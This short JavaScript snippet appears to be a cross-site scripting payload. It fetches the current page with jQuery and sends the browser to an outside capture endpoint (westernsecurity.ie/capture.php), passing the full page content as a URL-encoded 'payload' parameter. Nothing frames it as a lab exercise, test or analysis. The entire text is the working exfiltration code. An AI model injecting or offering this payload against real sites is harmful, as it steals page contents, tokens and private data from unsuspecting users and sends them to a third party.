$.get('', (data) => {
    window.location.href = "https://westernsecurity.ie/capture.php?payload=" + encodeURIComponent(data);
})